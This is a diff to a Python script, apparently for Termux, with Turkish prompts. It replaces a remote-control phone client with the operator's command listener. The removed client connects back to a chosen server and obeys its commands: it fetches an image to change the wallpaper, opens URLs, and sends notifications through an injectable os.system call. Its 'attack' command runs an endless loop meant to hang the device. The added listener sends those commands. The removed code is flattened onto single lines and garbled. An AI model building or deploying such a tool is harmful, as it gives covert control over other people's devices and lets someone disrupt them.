@@ -1,20 +1,33 @@
-client.py
+import socket
+import os
+import time
 
-import socket import os import urllib.request
+PORT = int(input("Port gir: "))
+s = socket.socket()
+try:
+    s.bind(("0.0.0.0", PORT))
+    s.listen(1)
+    print(f"[✓] Dinleniyor: 0.0.0.0:{PORT}")
+except Exception as e:
+    print(f"[!] Port hatasi: {e}")
+    exit()
 
-SERVER_IP = input("Server IP gir: ") PORT = int(input("Port gir: "))
+try:
+    conn, addr = s.accept()
+    print(f"[✓] Baglandi: {addr}")
+    print(conn.recv(1024).decode())
+except Exception as e:
+    print(f"[!] Baglanti hatasi: {e}")
+    exit()
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((SERVER_IP, PORT)) s.send("[✓] Baglanti basarili".encode()) except: print("[!] Baglanti hatasi") exit()
-
-def arkaplan_degistir(url): try: urllib.request.urlretrieve(url, "arka.jpg") os.system("termux-wallpaper -f arka.jpg") s.send("[✓] Arkaplan degistirildi".encode()) except: s.send("[!] Arkaplan degistirilemedi".encode())
-
-def google_ac(): os.system("termux-open-url https://www.google.com") s.send("[✓] Google acildi".encode())
-
-def uyari_gonder(mesaj): os.system(f'termux-notification --title "UYARI" --content "{mesaj}"') s.send("[✓] Uyari gonderildi".encode())
-
-def telefon_cokert(): while True: os.system("echo 'Fsociety!' > /dev/null")
-
-while True: try: komut = s.recv(1024).decode().strip() if komut.startswith("arkaplan "): _, url = komut.split(" ", 1) arkaplan_degistir(url) elif komut == "google": google_ac() elif komut.startswith("uyari "): _, mesaj = komut.split(" ", 1) uyari_gonder(mesaj) elif komut == "saldiri": telefon_cokert() elif komut == "exit": break else: s.send("[!] Gecersiz komut".encode()) except: break
-
-s.close()
-
+while True:
+    try:
+        komut = input("Komut > ")
+        conn.send(komut.encode())
+        if komut == "exit":
+            break
+        cevap = conn.recv(4096).decode()
+        print(cevap)
+    except Exception as e:
+        print(f"[!] Baglanti koptu: {e}")
+        break
